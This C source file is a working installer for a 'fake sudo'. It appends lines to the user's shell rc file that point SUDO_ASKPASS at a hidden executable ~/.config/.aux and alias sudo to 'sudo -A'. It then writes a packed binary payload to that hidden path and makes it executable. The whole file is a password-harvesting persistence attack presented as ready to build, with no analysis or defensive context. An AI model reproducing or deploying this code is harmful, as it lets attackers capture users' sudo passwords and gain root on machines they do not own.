#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>
#include "pack.h"

int main() {
	char* shell = getenv("SHELL");
	char* aux = shell;
	while(aux-1) {
		shell = aux;
		aux = 1 + strchr(aux, '/');
	}

	// Compute the source file.
	char* home = getenv("HOME");
	char* source = malloc(strlen(home) + 2 + strlen(shell) + 3);
	strcpy(source, home);
	strcat(source, "/.");
	strcat(source, shell);
	strcat(source, "rc");

	if(access(source, R_OK) == -1) {
		// File does not exist. Use '.bashrc'.
		free(source);
		source = malloc(strlen(home) + 9);
		strcpy(source, home);
		strcat(source, "/.bashrc");
	}

	// Append the fake sudo.
	FILE* fd = fopen(source, "a");
	char toWrite[] = "\nexport SUDO_ASKPASS=\"$HOME/.config/.aux\"\nalias sudo='sudo -A'\n";
	fwrite(toWrite, 1, strlen(toWrite), fd);
	fclose(fd);
	free(source);

	// Check whether the directory exists.
	struct stat st = {0};
	char* f = malloc(strlen(home) + 8 + 6);
	strcpy(f, home);
	strcat(f, "/.config");
	if(stat(f, &st) == -1) mkdir(f, 0700);

	// Dump the fake sudo.
	strcat(f, "/.aux");
	fd = fopen(f, "w");
	fwrite(PACKED, 1, PACKED_SIZE, fd);
	fclose(fd);

	// chmod +x
	char mode[] = "0755";
	int i = strtol(mode, 0, 8);
	chmod(f, i);

	return 0;
}
